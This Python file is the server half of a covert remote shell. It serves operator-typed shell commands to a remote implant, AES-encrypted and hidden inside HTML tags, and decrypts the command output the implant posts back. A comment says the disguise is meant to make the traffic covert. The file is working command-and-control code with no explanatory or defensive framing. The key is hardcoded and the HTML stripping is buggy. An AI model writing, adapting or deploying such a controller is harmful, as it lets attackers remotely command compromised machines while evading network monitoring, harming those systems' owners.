#!/usr/bin/env python3
import pyaes
import base64
from http.server import BaseHTTPRequestHandler, HTTPServer
from time import sleep

#  from sys import stdin, argv
from sys import argv

#  from termios import tcgetattr, TCSADRAIN
#  from tty import setraw, tcsetattr

# key must be bytes, so we convert it
key = b"This_key_for_demo_purposes_only!"


def enc(data):
    """
    ENCRYPTION
    AES CRT mode - 256 bit (32 byte) key
    :param data: data to encrypt
    :return: base64 wrapper AES encrypted data
    """
    aes = pyaes.AESModeOfOperationCTR(key)
    ciphertext = aes.encrypt(data)
    encoded = base64.b64encode(ciphertext).decode()
    # show the encrypted data
    return encoded


def denc(data):
    """
    DECRYPTION
    AES CRT mode decryption requires a new instance be created
    :param data: base64 encoded ciphertext
    :return: plaintext
    """
    aes = pyaes.AESModeOfOperationCTR(key)
    # decrypted data is always binary, need to decode to plaintext
    decoded = base64.b64decode(data)
    decrypted = aes.decrypt(decoded).decode('utf-8')
    return decrypted


command_history = []


class ShellServer(BaseHTTPRequestHandler):

    def _set_headers(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()

    def do_GET(self):
        self._set_headers()
        cmds = command_history
        # content_length = int(self.headers['Content-Length'])
        try:
            data = input('$ ')
        except KeyboardInterrupt:
            quit_now = input('Quit? (y/n/r/h)')  # yes/no/restart/command history
            if quit_now == 'y':
                exit(0)
            elif quit_now == 'r':
                print('Restarting server ...')
                return False
            elif quit_now == 'c':
                print('Command history: ')
                for cmd in cmds:
                    print(cmd)
            else:
                print('Waiting for reconnection ...')
                return
        else:
            cmds.append(data)
            data = enc(data)
            content = ("<html><body><h1>%s</h1></body></html>" % data).encode()
            try:
                self.wfile.write(content)
            except BrokenPipeError:
                print('Broken Pipe, wait for reconnection ... ')

    def do_HEAD(self):
        self._set_headers()

    def do_POST(self):
        self._set_headers()
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)  # <--- Gets the data itself
        post_data = str(post_data)
        """ Strip out HTML wrapping (to make this shit covert)"""
        _post_data = post_data.strip('<html><body><h1>')
        _post_data = post_data.strip('</h1></body></html>')
        res = denc(_post_data)
        print(res)
        return


def run(server_class=HTTPServer, handler_class=ShellServer, port=80):

    server_address = ('0.0.0.0', port)
    httpd = server_class(server_address, handler_class)
    print('Starting httpd...')
    while True:
        httpd.serve_forever()
        print('Restarting server ... ')
        sleep(1)

#  TODO: implement scrolling of command history

"""class _Getch:
    def __call__(self):
        fd = stdin.fileno()
        old_settings = tcgetattr(fd)
        try:
            setraw(stdin.fileno())
            ch = stdin.read(3)
        finally:
            tcsetattr(fd, TCSADRAIN, old_settings)
        return ch
def scroll():
    inkey = _Getch()
    while(1):
            k = inkey()
            if k != '':break
    if k == '\x1b[A':
        print("up")
    elif k == '\x1b[B':
        print("down")
    else:
       pass"""


if __name__ == "__main__":

    if len(argv) == 2:
        run(port=int(argv[1]))
    else:
        run(port=8080)